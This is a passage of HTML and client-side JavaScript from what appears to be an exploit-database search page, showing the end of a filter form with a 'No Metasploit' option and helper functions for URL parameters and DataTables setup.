                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
